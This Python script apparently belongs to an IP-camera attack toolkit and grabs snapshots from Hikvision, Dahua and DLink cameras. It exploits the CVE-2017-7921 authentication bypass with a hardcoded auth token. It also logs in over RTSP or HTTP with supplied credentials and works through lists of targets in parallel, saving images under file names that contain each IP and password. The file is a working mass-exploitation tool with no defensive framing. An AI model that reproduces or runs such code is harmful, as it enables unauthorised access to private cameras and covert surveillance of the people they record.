"""Some tools about camera"""
import os
import sys
import requests
import argparse
from functools import partial

import rtsp
from PIL import Image

CWD = os.path.dirname(__file__)
sys.path.append(os.path.join(CWD, '..'))
from utils.base import multi_thread
from utils.config import TIMEOUT, MAX_RETRIES


def get_parser():
    parser = argparse.ArgumentParser()
    parser.add_argument('--ip', type=str, required=False)
    parser.add_argument('--port', type=str, required=False)
    parser.add_argument('--user', type=str, required=False)
    parser.add_argument('--passwd', type=str, required=False)
    parser.add_argument('--device', type=str, required=False)
    parser.add_argument('--vulnerability', type=str, required=False)
    parser.add_argument('--in_file', type=str, required=False, default='')
    parser.add_argument('--sv_path', type=str, required=True)

    args = parser.parse_args()
    return args


def save_snapshot(args) -> None:
    snapshot_path = os.path.join(args.sv_path, 'snapshots')
    if not os.path.exists(snapshot_path):
        os.makedirs(snapshot_path)

    if args.in_file:
        with open(args.in_file, 'r') as f:
            items = [l.strip().split(',') for l in f if l.strip()]
        _func = partial(snapshot_switch, snapshot_path=snapshot_path)
        multi_thread(_func, items, processes=16)
    else:
        camera_info = [args.ip, args.port, args.user, args.passwd, args.device, args.vulnerability]
        snapshot_switch(camera_info, snapshot_path)


def snapshot_switch(camera_info, snapshot_path):
    """select diff func to save snapshot"""
    try:
        # cve-2017-7921
        if camera_info[-1] == 'cve-2017-7921':
            snapshot_cve_2017_7921(camera_info[0], camera_info[1], snapshot_path)
        # user & passwd
        elif camera_info[2]:
            # Dahua / Hikvision
            if camera_info[4] == 'Dahua' or camera_info[4] == 'Hikvision':
                snapshot_rtsp(*camera_info[:4], snapshot_path)
            # Hikvision multiplay / HB-Teck
            if camera_info[4] == 'HB-Tech/Hikvision':
                snapshot_rtsp(*camera_info[:4], snapshot_path, multiplay=True)
            if camera_info[4] == 'DLink':
                snapshot_dlink(*camera_info[:4], snapshot_path)
    except Exception as e:
        pass


def snapshot_rtsp(ip, port, user, passwd, sv_path, multiplay=False):
    """get snapshot through rtsp"""
    if not multiplay: url = f"rtsp://{user}:{passwd}@{ip}:554"
    else: url = f"rtsp://{user}:{passwd}@{ip}:554/h264/ch0/main/av_stream"
    with rtsp.Client(rtsp_server_uri=url, verbose=False) as client:
        while client.isOpened():
            img_bgr = client.read(raw=True)
            if not img_bgr is None:
                img_rgb = img_bgr.copy()
                img_rgb[:,:,0] = img_bgr[:,:,2]
                img_rgb[:,:,1] = img_bgr[:,:,1]
                img_rgb[:,:,2] = img_bgr[:,:,0]
                name = f"{ip}:{port}-{user}-{passwd}.jpg"
                img = Image.fromarray(img_rgb)
                img.save(os.path.join(sv_path, name))
                break


def snapshot_dlink(ip, port, user, passwd, sv_path):
    for _ in range(MAX_RETRIES):
        r = requests.get(f"http://{ip}:{port}/dms?nowprofileid=1", auth=(user, passwd), timeout=TIMEOUT)
        if r.status_code == 200:
            name = f"{ip}:{port}-{user}-{passwd}.jpg"
            with open(os.path.join(sv_path, name), 'wb') as f:
                f.write(r.content)
    

def snapshot_cve_2017_7921(ip, port, sv_path):
    for _ in range(MAX_RETRIES):
        r = requests.get(f"http://{ip}:{port}/onvif-http/snapshot?auth=YWRtaW46MTEK", timeout=TIMEOUT)
        if r.status_code == 200:
            name = f"{ip}:{port}-cve_2017_7921.jpg"
            with open(os.path.join(sv_path, name), 'wb') as f:
                f.write(r.content)


if __name__ == '__main__':
    args = get_parser()
    save_snapshot(args)
